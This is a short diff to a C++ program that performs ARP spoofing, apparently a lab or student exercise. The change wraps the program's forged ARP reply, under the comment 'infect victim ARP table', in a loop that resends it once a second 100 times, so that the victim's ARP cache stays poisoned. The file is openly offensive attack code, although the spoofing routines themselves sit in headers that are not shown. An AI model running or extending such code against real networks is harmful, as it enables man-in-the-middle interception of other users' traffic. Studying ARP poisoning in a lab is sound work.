@@ -1,6 +1,7 @@
 #include <iostream>
 #include <stdlib.h>
 #include <string.h>
+#include <unistd.h>
 #include "info_network.hpp"
 #include "verification.hpp"
 using namespace std;
@@ -29,7 +30,10 @@ int main(int argc, char *argv[], char *envp[])
     arp.print_status();
     
     // infect victim ARP table
-    arp.arp_reply();
+    for(int i = 0; i < 100; i++){
+        sleep(1);
+        arp.arp_reply();
+    }
 
     return 0;
 }
